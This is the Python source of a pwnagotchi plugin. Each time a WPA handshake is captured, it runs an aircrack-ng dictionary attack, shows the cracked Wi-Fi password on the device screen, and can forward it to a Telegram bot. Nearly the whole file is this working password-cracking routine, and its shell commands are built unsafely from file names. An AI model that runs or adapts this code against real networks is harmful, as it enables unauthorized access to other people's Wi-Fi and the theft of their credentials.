from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import io
import os

class QuickDic(plugins.Plugin):
    __author__ = 'silentree12th'
    __version__ = '1.4.5'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as qrcode and plain text over to telegram bot.'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': True,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
    }

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info('[better_quickdic] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
        if 'api' not in self.options:
            self.options['api'] = None
        if 'id' not in self.options:
            self.options['id'] = None
            
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[quickdic] Found %s' %check)
        else:
            logging.warning('[quickdic] aircrack-ng is not installed!')

        #if self.options['id'] != None and self.options['api'] != None:
            #self._send_message(filename='Android AP', pwd='12345678')

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode(
            'utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info('[quickdic] No handshake')
        else:
            logging.info('[quickdic] Handshake confirmed')
            result2 = subprocess.run(('aircrack-ng -w `echo ' + self.options[
                'wordlist_folder'] + '*.txt | sed \'s/ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info('[quickdic] %s' %result2)
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password: " + pwd
                #logging.warning('!!! [quickdic] !!! %s' % self.text_to_set)
                display.set('face', self.options['face'])
                display.set('status', self.text_to_set)
                self.text_to_set = ""
                display.update(force=True)
                #plugins.on('cracked', access_point, pwd)
                if self.options['id'] != None and self.options['api'] != None:
                    self._send_message(filename, pwd)
